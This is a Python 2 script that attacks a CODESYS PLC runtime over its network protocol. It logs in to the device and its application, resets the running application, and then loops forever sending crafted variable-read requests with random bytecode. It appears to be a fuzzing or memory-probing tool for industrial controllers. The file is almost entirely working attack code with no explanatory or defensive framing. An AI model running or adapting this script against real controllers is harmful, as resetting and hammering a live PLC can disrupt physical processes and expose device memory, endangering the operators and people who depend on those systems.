#! /usr/bin/env python2
import os
import struct
import sys
import time

sys.path.append("..")
from lib import pycodesys
from lib.layers import layer7, parse_tags_to_dict, s_tag
from lib.utils import pretty_format_tagsdict, pretty_format_tagslist
from lib.pycodesys import CodesysNode, VMeta, CDS_WORD, CDS_INT, CDS_SIZE, CDS_TYPE_IDS
from struct import pack

'''
Mon2 0x1b Read 0x1

'''


def read_variables(type, size, bcode):
    retrieved_list = []
    if cds.verbose:
        print('[c] Reading variables')
    if not cds.app_sess_id:
        exit('[-] Login to App first')

    # Auth tokens
    tag_1 = s_tag(0x1,
                  pack("<I", cds.app_sess_id) + pack("<I",
                                                      cds.app_sess_id2) + "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")

    # Iterate through varlist
    t82_multiple = ''

    read_id = 50
    read_size = size
    read_type = type


    read_bcode = bcode + "\x00\x00\x00"
    read_bsize = len(bcode)

    t82_one = s_tag(0x82,
                    s_tag(0x1, pack("<I", read_id)) + \
                    s_tag(0x2, pack("<I", read_size)) + \
                    s_tag(0x3, pack("<I", read_type)) + \
                    s_tag(0x4, pack("<I", read_bsize)) + \
                    s_tag(0x5, read_bcode))
    t82_multiple += t82_one

    # List of vars to read. IDE sends s_tag(0x81, t82_1+t82_2+t82_3+t82_4)
    tag_81 = s_tag(0x81, t82_multiple)
    tagdata = tag_1 + tag_81
    if cds.verbose:
        print('[*] Reading bsize %s bcode %s' % (read_bsize, read_bcode.encode('hex')))

    cds.send_layer7(layer7(service_group=0x1b, command_id=0x1, sess_id=cds.sess_id, data=tagdata))
    res_tags = cds.recv_layer7()

    '''
    Response
           id   size
    [0x40] 0100 04000000 | f7000 000 
         | 0200 04000000 | f1000 000 
         | 0300 02000000 | 0124 
         | 0400 04000000 | babababa 0000
    '''
    # 0x40 is ReadValueList. 0x41 is error
    if not 0x40 in res_tags:
        print('[-] Error when reading variables')
        return None

    if res_tags[0x40] == '\x04\x80\x0a\x00\x00\x00\x00\x00':
        print('[-] Error when reading variables')
        return None

    if res_tags[0x40] == '\x64\x00\x02\x00\x00\x00\x00\x00':
        print('[-] Error when reading variables')
        return None

    # Check IDs
    expected_id = 50
    str_expected_id = str(hex(expected_id)[2:])
    if not (str_expected_id.decode('hex') in res_tags[0x40]):
        print('[-] This variable is not retrieved: 0x' + str(expected_id) + ' (' + str_expected_id + ')')

    # Parse results
    retrieved_list = [res_tags[0x40].encode('hex')]
    # import ipdb;ipdb.set_trace()
    print('[*] Variables retrieved: ' + str(retrieved_list))
    return retrieved_list



cds = pycodesys.CodesysNode(host=sys.argv[1], port=11740, verbose=False)
chan_id = cds.connect()

# Login to Device
cds.loginToDevice()

# List loaded applications
appname = cds.readAppList()
print(appname)

#  Login to App
cds.loginToApp(appname)

cds.reset()



# From log
# area=0, size=1048576, type=0xfe9f, addr=0x0xf78d9000
# area=3, size=1048576, type=0x0040, addr=0x0xf77d9000

A_SIZE=0x100000 # dec 1048576

A3_ADDR=0xf77d9000
A3_END = 0xF78D9000

A0_ADDR=0xf78d9000
A0_END=0xF79D9000



# Build L7 payload

if cds.verbose:
    print('[c] Writing variables')

if not cds.app_sess_id:
    print('Login to App first')
    exit('Login to App first')

if not cds.app_sess_id2:
    print('Login to App first')
    exit('Login to App first')

# BABA str
# var_offset = 0x35f8
# var_type = 0x10
# var_size = 4

offset = 0x35f8
while True:
    offset = 0x35f8

    bcode = os.urandom(4)


    read_variables(type=0x10, size=100, bcode=bcode)

cds.disconnect()







